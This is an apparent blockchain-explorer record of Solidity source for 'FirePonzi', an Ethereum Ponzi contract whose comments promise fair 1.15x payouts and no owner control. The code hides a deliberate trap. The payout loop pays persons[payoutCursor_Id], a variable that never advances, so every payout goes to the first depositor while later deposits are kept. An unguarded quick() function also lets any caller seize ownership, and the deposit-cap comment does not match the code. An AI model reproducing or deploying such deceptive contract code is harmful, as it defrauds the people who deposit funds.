{"SourceCode":"contract FirePonzi {\r\n   // NO FEE PONZI, 1.15 Multiplier, Limited to 3 Ether deposits, FAST and designed to be on FIRE !\r\n   // Only input and output, no destroy function, owner can do nothing !\r\n   \r\n  struct Player {\r\n      address etherAddress;\r\n      uint deposit;\r\n  }\r\n\r\n  Player[] public persons;\r\n\r\n  uint public payoutCursor_Id_ = 0;\r\n  uint public balance = 0;\r\n\r\n  address public owner;\r\n\r\n\r\n  uint public payoutCursor_Id=0;\r\n  modifier onlyowner { if (msg.sender == owner) _ }\r\n  function quick() {\r\n    owner = msg.sender;\r\n  }\r\n\r\n  function() {\r\n    enter();\r\n  }\r\n  function enter() {\r\n    if (msg.value < 100 finney) { // Only  > 0.1 Eth depoits\r\n        msg.sender.send(msg.value);\r\n        return;\r\n    }\r\n\t\r\n\tuint deposited_value;\r\n\tif (msg.value > 2 ether) { //Maximum 3 Eth per deposit\r\n\t\tmsg.sender.send(msg.value - 2 ether);\t\r\n\t\tdeposited_value = 2 ether;\r\n    }\r\n\telse {\r\n\t\tdeposited_value = msg.value;\r\n\t}\r\n\r\n\r\n    uint new_id = persons.length;\r\n    persons.length += 1;\r\n    persons[new_id].etherAddress = msg.sender;\r\n    persons[new_id].deposit = deposited_value;\r\n \r\n    balance += deposited_value;\r\n    \r\n\r\n\r\n    while (balance > persons[payoutCursor_Id_].deposit / 100 * 115) {\r\n      uint MultipliedPayout = persons[payoutCursor_Id_].deposit / 100 * 115;\r\n      persons[payoutCursor_Id].etherAddress.send(MultipliedPayout);\r\n\r\n      balance -= MultipliedPayout;\r\n      payoutCursor_Id_++;\r\n    }\r\n  }\r\n\r\n\r\n  function setOwner(address _owner) onlyowner {\r\n      owner = _owner;\r\n  }\r\n}","ABI":"[{\"constant\":false,\"inputs\":[{\"name\":\"_owner\",\"type\":\"address\"}],\"name\":\"setOwner\",\"outputs\":[],\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"payoutCursor_Id_\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"name\":\"\",\"type\":\"address\"}],\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"payoutCursor_Id\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"name\":\"persons\",\"outputs\":[{\"name\":\"etherAddress\",\"type\":\"address\"},{\"name\":\"deposit\",\"type\":\"uint256\"}],\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"balance\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"enter\",\"outputs\":[],\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"quick\",\"outputs\":[],\"type\":\"function\"}]","ContractName":"FirePonzi","CompilerVersion":"v0.3.1-2016-04-07-054bc2a","OptimizationUsed":"1","Runs":"200","ConstructorArguments":"","Library":"","LicenseType":"","SwarmSource":""}
